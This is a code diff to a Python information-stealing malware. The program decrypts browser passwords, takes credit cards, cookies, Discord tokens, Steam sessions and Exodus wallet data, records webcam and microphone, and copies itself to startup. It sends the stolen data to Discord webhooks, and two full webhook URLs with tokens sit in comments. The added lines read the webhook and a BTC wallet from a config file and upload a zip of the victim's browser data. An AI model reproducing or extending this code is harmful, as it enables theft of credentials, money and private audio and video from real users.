@@ -54,7 +54,26 @@ def copy_to_startup():
     except PermissionError as e:
         pass  
 
-webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1131994024169963661/O5qGSqlm3_aJCVox5-3oKLEeF_znzWvmLMeDfyqQF2CICGnwY0BXYXlaHjuQlnVshZ02')#Set up webhook
+def parse_saved_variables():
+    variables = {}
+    with open(os.path.join(sys.path[0], "saved_variables.txt"), "r") as file:
+        for line in file:
+            line = line.strip()
+            if not line:
+                continue  # Skip empty lines
+            if ": " not in line:
+                continue
+            key, value = line.split(": ", 1)
+            variables[key] = value
+    return variables
+
+parsed_variables = parse_saved_variables()
+# Access the individual variables from the parsed dictionary
+webhook_url = parsed_variables.get("Webhook URL")
+copy_to_start_up = parsed_variables.get("Copy to startup?")
+btc_wallet = parsed_variables.get("BTC wallet")
+
+webhook = DiscordWebhook(url=f'{webhook_url}')#Set up webhook
 #test #https://discord.com/api/webhooks/1131994024169963661/O5qGSqlm3_aJCVox5-3oKLEeF_znzWvmLMeDfyqQF2CICGnwY0BXYXlaHjuQlnVshZ02
 #Suusy script https://discord.com/api/webhooks/1131994203019284581/S5wolQDreb40kHiaGO_qTSM4Ezs9MxH1MQrASxVu7Ko7k6R39G_p0y-cJy5UQKnqy81o
 def ip4():#Get ipv4
@@ -341,6 +360,7 @@ def password_decryption(password, encryption_key):
 		except:
 			return "No Passwords"
 def web_data():
+    creditcards = ""
     try:
         web_data_db = os.path.join(
             os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome",
@@ -602,8 +622,10 @@ def record_audio(duration=5, freq=44100, channels=2):
             pass    
     except Exception as e:
         print("Error:", str(e))
-    
+
+   
 webcamthread=threading.Thread(target=webcam())
+
 micthread=threading.Thread(target=record_audio())
 
 wifiembed=DiscordEmbed(title='Saved Wifi',description=f'```{wifi}```',color='60cc88')
@@ -615,8 +637,16 @@ steamsesembed = DiscordEmbed(title='Steam sessionid cookies',description=f'Opera
 discordtokenembed= DiscordEmbed(title='Discord Token',description=f'Token:\n```{Discordtokens()}```')
 
 webcamthread.start()
+ 
 micthread.start()
-
+try:
+    
+ with open(zipfolder(),'rb') as file:
+       webhook.add_file(file.read(), "History-Bookmarks-Cookies-Passwords-CreditCards-Autofill.zip")
+except PermissionError as e:
+    errorembed = DiscordEmbed(title='Permission error to access the browserfiles',description='```Victim needs computer shutdown for restrictions to be lifted```')
+    webhook.add_embed(errorembed)   
+    
 webhook.add_embed(sysembed) 
 webhook.add_embed(wifiembed)
 webhook.add_embed(locationembed)
@@ -629,9 +659,10 @@ try:
        webhook.add_file(file.read(), "History-Bookmarks-Cookies-Passwords-CreditCards-Autofill.zip")
 except PermissionError as e:
     webhook.set_content('Permission error to access the browserfiles. Victim needs computer shutdown for restrictions to be lifted')   
-screenie()#screenshots the users screen        
+screenie()#screenshots the users screen  
+   
 exo()#get exodus cryptowallet Appdata and adds the zip to webhook
-
+ 
 webcamthread.join()
 micthread.join()
 
